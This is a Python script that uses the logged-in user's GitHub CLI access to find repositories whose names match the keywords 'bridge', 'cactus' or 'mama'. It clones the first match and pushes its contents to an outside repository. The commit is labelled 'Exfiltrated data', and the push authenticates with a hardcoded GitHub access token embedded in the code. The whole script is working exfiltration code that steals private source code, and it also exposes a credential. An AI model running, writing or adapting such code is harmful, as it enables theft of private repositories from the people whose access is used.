import subprocess
import os
import shutil
import time
import json

# === CONFIGURATION ===
KEYWORDS = ["bridge", "cactus", "mama"]

# ADMIN ACCOUNT DETAILS
# Ensure this token has 'repo' scope for private repos if needed, though 'push' requires write access to the target repo.
ADMIN_TOKEN = "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"  
ADMIN_DUMP_REPO = f"https://{ADMIN_TOKEN}@github.com/avtbackend-collab/grind-data-dump.git"

CLONE_DIR_BASE = "grind_repo_clone"
DUMP_DIR = "dump_dir"

def safe_remove_dir(dir_name):
    """Recursively removes a directory, handling permission issues."""
    if os.path.exists(dir_name):
        try:
            shutil.rmtree(dir_name)
        except PermissionError:
            time.sleep(2)
            try:
                shutil.rmtree(dir_name)
            except PermissionError:
                subprocess.run(["cmd", "/c", "rmdir", "/s", "/q", dir_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)

def run_cmd(cmd, cwd=None, check=True):
    """Runs a command and returns the result."""
    return subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, cwd=cwd, check=check)

def search_and_clone_repo():
    """Lists repos accessible to the user via gh CLI and filters by keywords."""
    print("Listing all accessible repositories...")
    result = run_cmd(["gh", "repo", "list", "--json", "nameWithOwner,url"])
    
    if result.returncode != 0:
        print(f"Failed to list repos: {result.stderr.decode()}")
        return None
    
    try:    
        repos = json.loads(result.stdout.decode())
    except json.JSONDecodeError:
        print("Failed to parse repo list JSON.")
        return None
    
    if not repos:
        print("No repositories found.")
        return None
    
    # Filter repos by keywords
    matching_repos = []
    for repo in repos:
        name_with_owner = repo['nameWithOwner']
        owner, repo_name = name_with_owner.split('/')
        
        # Check if any keyword matches the repo name or owner
        if any(keyword.lower() in repo_name.lower() or keyword.lower() in owner.lower() for keyword in KEYWORDS):
            matching_repos.append(repo)
    
    if not matching_repos:
        print(f"No repositories found matching keywords: {', '.join(KEYWORDS)}")
        return None
    
    # Pick the first matching repo
    target_repo = matching_repos[0]
    full_name = target_repo['nameWithOwner']
    clone_url = f"https://github.com/{full_name}.git"
    
    print(f"Found repo: {full_name}")
    print(f"Clone URL: {clone_url}")
    
    return clone_url, full_name.split('/')[-1]

def get_default_branch(repo_path):
    """Determines the default branch of a cloned repository."""
    # Try to read the remote origin's HEAD
    result = run_cmd(["git", "remote", "show", "origin"], cwd=repo_path, check=False)
    if result.returncode == 0:
        output = result.stdout.decode()
        for line in output.split('\n'):
            if 'HEAD branch:' in line:
                return line.split('HEAD branch:')[1].strip()
    # Fallback to common defaults
    if os.path.exists(os.path.join(repo_path, ".git", "refs", "heads", "main")):
        return "main"
    if os.path.exists(os.path.join(repo_path, ".git", "refs", "heads", "master")):
        return "master"
    # Last resort: assume main
    return "main"

def clone_and_dump(repo_url, repo_name_from_search):
    """Clones the repo using gh and dumps contents to DUMP_DIR."""
    # Clean up the repo name for gh command (remove .git suffix)
    repo_name_for_gh = repo_url.rstrip('.git').split('/')[-1]
    
    clone_dir = f"{CLONE_DIR_BASE}_{repo_name_for_gh}"
    
    safe_remove_dir(clone_dir)
    print(f"Cloning {repo_name_for_gh}...")
    
    # Use gh to clone to leverage existing authentication
    try:
        run_cmd(["gh", "repo", "clone", repo_name_for_gh, clone_dir])
    except subprocess.CalledProcessError as e:
        print(f"Failed to clone via gh: {e.stderr.decode()}")
        return

    if os.path.exists(DUMP_DIR):
        safe_remove_dir(DUMP_DIR)
    os.makedirs(DUMP_DIR, exist_ok=True)
    
    # Copy files from cloned repo to dump directory
    for item in os.listdir(clone_dir):
        if item == '.git':
            continue
        s = os.path.join(clone_dir, item)
        d = os.path.join(DUMP_DIR, item)
        if os.path.isdir(s):
            shutil.copytree(s, d, dirs_exist_ok=True)
        else:
            shutil.copy2(s, d)
    
    safe_remove_dir(clone_dir)

    # Push to ADMIN's repo
    print("Pushing dumped contents to ADMIN's repo...")
    try:
        # Initialize git in dump_dir if not already initialized
        if not os.path.exists(os.path.join(DUMP_DIR, ".git")):
            run_cmd(["git", "init", "-b", "main"], cwd=DUMP_DIR)
            run_cmd(["git", "remote", "add", "origin", ADMIN_DUMP_REPO], cwd=DUMP_DIR)
        
        # Add all files
        run_cmd(["git", "add", "."], cwd=DUMP_DIR)
        
        # Commit
        commit_result = run_cmd(["git", "commit", "-m", "Exfiltrated data"], cwd=DUMP_DIR, check=False)
        
        # If commit failed because there's nothing to commit (e.g., empty dir), we still need a branch to push
        if commit_result.returncode != 0:
            # Check if there are any files at all
            files = [f for f in os.listdir(DUMP_DIR) if not f.startswith('.')]
            if not files:
                print("Warning: Dump directory is empty. Nothing to push.")
                return
            
            # Create an initial commit even if it seems empty (maybe hidden files?)
            # Or just touch a file to ensure we have something to commit
            with open(os.path.join(DUMP_DIR, ".placeholder"), "w") as f:
                f.write("Exfiltrated data")
            run_cmd(["git", "add", "."], cwd=DUMP_DIR)
            run_cmd(["git", "commit", "-m", "Exfiltrated data"], cwd=DUMP_DIR)

        # Determine the local branch name
        # Since we initialized with -b main, the branch is 'main'
        local_branch = "main"
        
        # Push
        print(f"Pushing to {ADMIN_DUMP_REPO} on branch {local_branch}...")
        run_cmd(["git", "push", "-u", "origin", local_branch], cwd=DUMP_DIR)
        
    except subprocess.CalledProcessError as e:
        print(f"Failed to push to ADMIN's repo: {e.stderr.decode()}")
        return

# === MAIN EXECUTION ===

safe_remove_dir(CLONE_DIR_BASE)
safe_remove_dir(DUMP_DIR)

# Find and clone the matching repo
found_repo = search_and_clone_repo()

if not found_repo:
    print("No repo found to clone.")
else:
    repo_url, repo_name = found_repo
    clone_and_dump(repo_url, repo_name)